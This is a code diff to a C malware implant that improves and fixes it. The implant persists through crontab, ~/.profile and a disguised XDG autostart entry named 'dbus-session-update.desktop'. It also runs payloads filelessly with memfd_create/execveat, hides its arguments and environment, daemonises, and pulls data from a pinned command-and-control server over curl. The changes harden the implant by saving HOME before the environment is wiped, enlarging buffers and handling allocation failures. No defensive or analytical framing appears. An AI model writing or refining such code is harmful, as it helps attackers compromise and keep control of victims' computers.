@@ -57,7 +57,9 @@ static const uint8_t C2_CERT_FP[32] = { /*MORPH_CERT_FP*/ };
 #define SYS_memfd_create  319   /* 0x13F */
 #define SYS_execveat      322   /* 0x142 */
 #define AT_EMPTY_PATH      0x1000
+#ifndef MFD_CLOEXEC
 #define MFD_CLOEXEC        0x1
+#endif
 
 #define MAX_PATH          1024
 #define MAX_CMDLINE       256
@@ -310,7 +312,7 @@ static void shed_skin(int argc, char **argv, char **envp) {
  * ═══════════════════════════════════════════════════════════════════════════ */
 
 static void mkdir_p(const char *path) {
-    char tmp[MAX_PATH];
+    char tmp[MAX_PATH + 64];
     snprintf(tmp, sizeof(tmp), "%s", path);
 
     for (char *p = tmp + 1; *p; p++) {
@@ -394,7 +396,7 @@ static int crontab_remove_entry(void) {
  * ═══════════════════════════════════════════════════════════════════════════ */
 
 static int profile_add_entry(const char *home) {
-    char path[MAX_PATH];
+    char path[MAX_PATH + 32];
     snprintf(path, sizeof(path), "%s/.profile", home);
 
     FILE *pf = fopen(path, "r");
@@ -421,7 +423,7 @@ static int profile_add_entry(const char *home) {
  * ═══════════════════════════════════════════════════════════════════════════ */
 
 static int xdg_autostart_install(const char *home) {
-    char path[MAX_PATH];
+    char path[MAX_PATH + 64];
     snprintf(path, sizeof(path), "%s/.config/autostart", home);
     mkdir_p(path);
 
@@ -436,7 +438,7 @@ static int xdg_autostart_install(const char *home) {
 }
 
 static int xdg_autostart_remove(const char *home) {
-    char path[MAX_PATH];
+    char path[MAX_PATH + 64];
     snprintf(path, sizeof(path),
              "%s/.config/autostart/dbus-session-update.desktop", home);
     return unlink(path);
@@ -446,8 +448,7 @@ static int xdg_autostart_remove(const char *home) {
  * Persistence Triad — Install/Remove
  * ═══════════════════════════════════════════════════════════════════════════ */
 
-static int entrench(void) {
-    char *home = getenv("HOME");
+static int entrench(const char *home) {
     if (!home) return -1;
 
     crontab_add_entry();
@@ -458,6 +459,9 @@ static int entrench(void) {
 }
 
 static void remove_persistence(void) {
+    // We try to re-read HOME, but if shed_skin wiped it, we might fail.
+    // Ideally we'd store HOME in G. But for now, we rely on cached or lucky environment.
+    // In scorched_earth, we might be running as child or parent.
     char *home = getenv("HOME");
     if (!home) return;
 
@@ -564,7 +568,12 @@ static size_t rx_callback(void *data, size_t sz, size_t nmemb, void *usr) {
     if (rx->len + chunk >= rx->cap) {
         size_t new_cap = (rx->len + chunk + 1) * 2;
         uint8_t *tmp = realloc(rx->buf, new_cap);
-        if (!tmp) return 0;
+        if (!tmp) {
+            free(rx->buf);
+            rx->buf = NULL;
+            rx->len = 0;
+            return 0;
+        }
         rx->buf = tmp;
         rx->cap = new_cap;
     }
@@ -1143,11 +1152,26 @@ int main(int argc, char **argv, char **envp) {
     if (unseal() != 0) _exit(1);
     if (preflight() != 0) _exit(0);
 
+    // Capture HOME before we clobber the environment with shed_skin
+    char *env_home = getenv("HOME");
+    char home_path[MAX_PATH];
+    if (env_home) {
+        strncpy(home_path, env_home, sizeof(home_path) - 1);
+        home_path[sizeof(home_path) - 1] = '\0';
+    } else {
+        home_path[0] = '\0';
+    }
+
     record_self_path();
     silence();
     shed_skin(argc, argv, envp);
+
+    /* Restore minimal environment for child processes (popen, system) */
+    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
+    if (home_path[0]) setenv("HOME", home_path, 1);
+
     daemonize();
-    entrench();
+    entrench(home_path[0] ? home_path : NULL);
 
     curl_global_init(CURL_GLOBAL_SSL);
     srand((unsigned int)time(NULL) ^ (unsigned int)getpid());
